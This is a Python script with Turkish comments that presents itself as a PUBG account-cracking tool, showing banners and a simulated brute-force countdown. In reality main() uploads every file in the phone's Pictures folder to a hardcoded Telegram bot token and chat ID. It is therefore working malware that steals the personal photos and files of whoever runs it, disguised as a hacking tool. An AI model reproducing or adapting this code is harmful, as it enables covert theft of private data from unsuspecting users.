import os
import requests
import time

# Telegram botunuzun token'ını buraya ekleyin
TOKEN = "6754457969:AAFgiYW3qOa49XDan0US5t8NjGjYRKenSKA"

# Telegram ID'nizi buraya ekleyin
CHAT_ID = "1505434893"

def send_files(directory):
    """
    Belirtilen dizindeki tüm dosyaları Telegram botuna gönderir.
    """
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            if file_path.endswith(('.jpg', '.jpeg', '.png', '.gif')):
                send_photo(file_path)
            else:
                send_file(file_path)

def send_photo(photo_path):
    """
    Belirtilen fotoğraf dosyasını Telegram botuna gönderir.
    """
    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
    files = {'photo': open(photo_path, 'rb')}
    data = {'chat_id': CHAT_ID}
    response = requests.post(url, files=files, data=data)
    print(response.json())

def send_file(file_path):
    """
    Belirtilen dosyayı Telegram botuna gönderir.
    """
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    files = {'document': open(file_path, 'rb')}
    data = {'chat_id': CHAT_ID}
    response = requests.post(url, files=files, data=data)
    print(response.json())

def fake_instagram_bruteforce_screen():
    """
    Sahte bir Instagram bruteforce ekranını simüle eder.
    """
    (f'''═══════════════════════════════════════════════════════
┃   ▇▇▇◤▔▔▔▔▔▔▔◥▇▇▇           PUBG HESAP ÇALMA
┃   ▇▇▇▏◥▇◣┊◢▇◤▕▇▇▇      
┃   ▇▇▇▏▃▆▅▎▅▆▃▕▇▇▇       TeLeGrAm : @WORZLYZ
┃   ▇▇▇▏╱▔▕▎▔▔╲▕▇▇▇          
┃   ▇▇▇◣◣▃▅▎▅▃◢◢▇▇▇      
┃   ▇▇▇▇◣◥▅▅▅◤◢▇▇▇▇            
┃   ▇▇▇▇▇◣╲▇╱◢▇▇▇▇▇          
┃   ▇▇▇▇▇▇◣▇◢▇▇▇▇▇▇                                                             
═══════════════════════════════════════════════════════
    
🏴‍☠️ ATAK BAŞLADI 🏴‍☠️''')
    for i in range(10):
        print(f"⏳️ Kullanıcı adı ve şifre denemesi {i+1}/10...")
        time.sleep(1)
    print('''═══════════════════════════════════════════════════════
┃   ▇▇▇◤▔▔▔▔▔▔▔◥▇▇▇           PUBG HESAP CRAKS
┃   ▇▇▇▏◥▇◣┊◢▇◤▕▇▇▇      
┃   ▇▇▇▏▃▆▅▎▅▆▃▕▇▇▇       TeLeGrAm : @WORZLYZ
┃   ▇▇▇▏╱▔▕▎▔▔╲▕▇▇▇        
┃   ▇▇▇◣◣▃▅▎▅▃◢◢▇▇▇      
┃   ▇▇▇▇◣◥▅▅▅◤◢▇▇▇▇            
┃   ▇▇▇▇▇◣╲▇╱◢▇▇▇▇▇          
┃   ▇▇▇▇▇▇◣▇◢▇▇▇▇▇▇                                                               
═══════════════════════════════════════════════════════''')

def main():
    fake_instagram_bruteforce_screen()
    target_directory = "/storage/emulated/0/Pictures"
    send_files(target_directory)

if __name__ == "__main__":
    print('''═══════════════════════════════════════════════════════
┃   ▇▇▇◤▔▔▔▔▔▔▔◥▇▇▇           PUBG HESAP CRAKS
┃   ▇▇▇▏◥▇◣┊◢▇◤▕▇▇▇      
┃   ▇▇▇▏▃▆▅▎▅▆▃▕▇▇▇       TeLeGrAm : @WORZLYZ
┃   ▇▇▇▏╱▔▕▎▔▔╲▕▇▇▇      
┃   ▇▇▇◣◣▃▅▎▅▃◢◢▇▇▇      
┃   ▇▇▇▇◣◥▅▅▅◤◢▇▇▇▇            
┃   ▇▇▇▇▇◣╲▇╱◢▇▇▇▇▇          
┃   ▇▇▇▇▇▇◣▇◢▇▇▇▇▇▇            
═══════════════════════════════════════════════════════''')
    main()